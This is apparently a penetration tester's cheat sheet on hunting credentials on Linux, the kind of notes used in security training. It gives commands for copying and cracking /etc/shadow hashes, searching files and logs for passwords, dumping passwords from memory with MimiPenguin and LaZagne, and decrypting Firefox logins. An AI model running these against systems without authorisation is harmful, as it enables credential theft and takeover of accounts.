# Linux Credential Hunting

Techniques for finding and extracting credentials on Linux systems, including password hashes, config files, and memory.

---

## Tools

| Tool                                                       | Description                                                  |
| ---------------------------------------------------------- | ------------------------------------------------------------ |
| [MimiPenguin](https://github.com/huntergregal/mimipenguin) | Dump the login password from current user                    |
| [LaZagne](https://github.com/AlessandroZ/LaZagne)          | **Retrieve lots of passwords** stored on a local computer    |
| Firefox Decrypt                                            | Tool to extract passwords from Mozilla profiles (Firefox, Thunderbird) |

---

## Local Password Hashes

### Passwd and Shadow Files

```bash
# Copy passwd, shadow, and opasswd (old passwords)
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
sudo cat /etc/security/opasswd
```

### Cracking Credentials

```bash
# Combine passwd and shadow for cracking
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Crack with hashcat
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# John single crack mode (based on username)
grep martin unshadowed.hashes > passwd
john --single passwd
```

---

## Searching for Credentials in Files

```bash
# Find config files
for l in $(echo ".conf .config .cnf"); do
  echo -e "\nFile extension: $l"
  find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done

# Search configs for keywords
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do
  echo -e "\nFile: $i"
  grep "user\|password\|pass" $i 2>/dev/null | grep -v "#"
done
```

### Databases and Notes

```bash
# Search for database files
for l in $(echo ".sql .db .*db .db*"); do
  echo -e "\nDB File extension: $l"
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"
done

# Search for text notes
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### Scripts

```bash
# Likely to contain creds (Python, Perl, Bash, etc.)
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
  echo -e "\nFile extension: $l"
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share"
done
```

---

## Logs and History

```bash
# Interesting locations
/etc/cron
~/bash_history
```

### Common Logs

| File                | Description                          |
| ------------------- | ------------------------------------ |
| `/var/log/messages` | Generic system logs                  |
| `/var/log/auth.log` | Authentication logs (Debian)         |
| `/var/log/secure`   | Authentication logs (RedHat/CentOS)  |
| `/var/log/syslog`   | Generic system logs                  |
| `/var/log/boot.log` | Boot information                     |
| `/var/log/kern.log` | Kernel warnings and errors           |
| `/var/log/faillog`  | Failed login attempts                |
| `/var/log/cron`     | Cron job logs                        |
| `/var/log/mail.log` | Mail server logs                     |
| `/var/log/httpd`    | Apache logs                          |
| `/var/log/mysqld.log` | MySQL logs                        |

```bash
# Grep for login activity in logs
for i in $(ls /var/log/* 2>/dev/null); do
  GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND=\|logs" $i 2>/dev/null)
  if [[ $GREP ]]; then
    echo -e "\n#### Log file: $i"
    echo "$GREP"
  fi
done
```

---

## Memory and Cache Tools

```bash
# Dump current desktop password
sudo python3 mimipenguin.py

# Retrieve stored creds from many apps
sudo python2.7 laZagne.py all

# Decrypt Firefox credentials
ls -l .mozilla/firefox/ | grep default
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
python3.9 firefox_decrypt.py
```

---
